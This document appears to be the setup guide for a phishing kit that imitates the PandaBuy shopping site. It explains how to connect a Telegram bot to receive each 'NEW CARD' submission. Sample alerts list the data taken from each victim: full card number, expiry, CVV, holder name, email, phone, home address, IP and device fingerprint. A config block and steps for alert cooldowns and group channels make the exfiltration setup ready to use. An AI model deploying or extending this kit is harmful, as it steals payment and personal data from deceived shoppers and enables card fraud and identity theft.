# 🤖 Telegram Bot Setup Guide

This guide will walk you through setting up a Telegram bot to receive card submissions and visit notifications automatically.

## 📋 Prerequisites

- Telegram account
- Access to @BotFather on Telegram
- Your PandaBuy server running

## 🚀 Step-by-Step Setup

### Step 1: Create a Telegram Bot

1. **Open Telegram** and search for `@BotFather`
2. **Start a chat** with @BotFather by clicking "Start"
3. **Create a new bot** by sending: `/newbot`
4. **Choose a name** for your bot (e.g., "PandaBuy Admin Bot")
5. **Choose a username** for your bot (must end with 'bot', e.g., "pandabuy_admin_bot")
6. **Save the bot token** - BotFather will give you a token like: `1234567890:ABCdefGHIjklMNOpqrsTUVwxyz`

### Step 2: Get Your Chat ID

**Option A: Using @userinfobot (Recommended)**
1. Search for `@userinfobot` on Telegram
2. Start a chat and send any message
3. The bot will reply with your user info including your **Chat ID**
4. Copy the number (e.g., `123456789`)

**Option B: Using Telegram Web**
1. Open [web.telegram.org](https://web.telegram.org)
2. Open any chat
3. Look at the URL - your chat ID is the number after `#/im?p=u`

**Option C: For Group Chats**
1. Add your bot to the group
2. Send a message in the group
3. Visit: `https://api.telegram.org/bot<YOUR_BOT_TOKEN>/getUpdates`
4. Look for the "chat" object and find the "id" field

### Step 3: Configure Your Bot

1. **Copy the config file:**
   ```bash
   cp config.js config.local.js
   ```

2. **Edit config.local.js** with your credentials:
   ```javascript
   module.exports = {
       telegram: {
           // Replace with your actual bot token from @BotFather
           botToken: '1234567890:ABCdefGHIjklMNOpqrsTUVwxyz',
           
           // Replace with your actual chat ID
           chatId: '123456789',
           
           notifications: {
               // Send notification for every card submission
               sendCardAlerts: true,
               
               // Send notification for visits (can be spammy)
               sendVisitAlerts: false,
               
               // Only send visit alerts for specific pages
               visitAlertPages: ['/'],
               
               // Minimum time between visit alerts (in minutes)
               visitAlertCooldown: 5
           }
       },
       
       server: {
           port: process.env.PORT || 3000,
           enableTelegram: true
       }
   };
   ```

3. **Save the file** and restart your server

### Step 4: Test Your Bot

1. **Restart your server:**
   ```bash
   node server.js
   ```

2. **Test the bot connection:**
   - Visit: `http://localhost:3000/test-telegram`
   - You should see a success message
   - Check your Telegram chat for a test message

3. **Test with real data:**
   - Submit a card through your form
   - You should receive a formatted notification in Telegram

## 📱 What You'll Receive

### Card Submission Notifications
```
🚨 NEW CARD! 🚨
📅 6/12/2025 at 10:30:45 PM
🌐 pandabuycn.com

💳 CARD DETAILS
├ 💳 Visa
├ Number: 4532 1234 5678 9012
├ Holder: John Doe
├ Expires: 12/25
└ CVV: 123

👤 CUSTOMER INFO
├ 📧 Email: john@example.com
├ 📱 Phone: +1234567890
├ 🏠 Address: 123 Main St
├ 🏙️ City: New York
├ 📍 State: NY
├ 📮 ZIP: 10001
└ 🌍 Country: United States

🔍 VISITOR TRACKING
├ 🌐 IP: 192.168.1.100
├ 📍 Location: New York, United States
├ 🌐 Browser: Chrome v91.0
├ 💻 OS: Windows 10
├ 📱 Device: Desktop
├ 🖥️ Screen: 1920x1080
└ 🕐 Timezone: America/New_York

⚡ SUBMISSION TIME: 6/12/2025, 10:30:45 PM
🔗 View Admin Panel: https://pandabuycn.com/admin-cards
```

### Visit Notifications (Optional)
```
👁️ NEW VISITOR

🌐 LOCATION
├ IP: 192.168.1.100
├ Country: United States
├ City: New York
└ Timezone: America/New_York

💻 DEVICE & BROWSER
├ Browser: Chrome v91.0
├ OS: Windows 10
├ Device: Desktop
└ Screen: 1920x1080

📄 PAGE INFO
├ Page: /
├ Referrer: Direct
└ Language: en-US

⏰ Time: 6/12/2025, 10:30:45 PM
```

## ⚙️ Configuration Options

### Notification Settings

```javascript
notifications: {
    // Enable/disable card alerts
    sendCardAlerts: true,
    
    // Enable/disable visit alerts (can be spammy for high traffic)
    sendVisitAlerts: false,
    
    // Only send visit alerts for these pages
    visitAlertPages: ['/', '/ship-out.html'],
    
    // Minimum minutes between visit alerts (prevents spam)
    visitAlertCooldown: 5
}
```

### Security Considerations

1. **Keep your bot token secret** - never share it publicly
2. **Use a private chat** or group for notifications
3. **Consider disabling visit alerts** for high-traffic sites
4. **Regularly check your bot's security** in @BotFather

## 🔧 Troubleshooting

### Common Issues

**"Telegram bot not configured"**
- Make sure you created `config.local.js`
- Check that your bot token is correct
- Ensure `enableTelegram: true` in config

**"Chat not found"**
- Verify your chat ID is correct
- Make sure you've started a chat with your bot
- For groups, ensure the bot is added and has permission to send messages

**"Unauthorized"**
- Double-check your bot token
- Make sure you copied it correctly from @BotFather

**Messages not sending**
- Test the connection: `http://localhost:3000/test-telegram`
- Check server console for error messages
- Verify your internet connection

### Testing Commands

```bash
# Test bot connection
curl http://localhost:3000/test-telegram

# Check server logs
tail -f server.log

# Restart server
node server.js
```

## 🎯 Advanced Features

### Custom Message Formatting

You can modify the message format in `telegram-bot.js`:
- Edit `formatCardMessage()` for card notifications
- Edit `formatVisitMessage()` for visit notifications
- Use HTML formatting for rich text

### Group Notifications

1. Create a Telegram group
2. Add your bot to the group
3. Make the bot an admin (optional)
4. Use the group chat ID instead of personal chat ID

### Multiple Bots

You can set up multiple bots for different purposes:
- One for card alerts
- One for visit notifications
- One for admin alerts

## 📞 Support

If you need help:
1. Check the server console for error messages
2. Test the bot connection endpoint
3. Verify your configuration file
4. Make sure your bot token and chat ID are correct

The bot will automatically start working once properly configured and will send notifications for all card submissions and optionally for visits based on your settings. 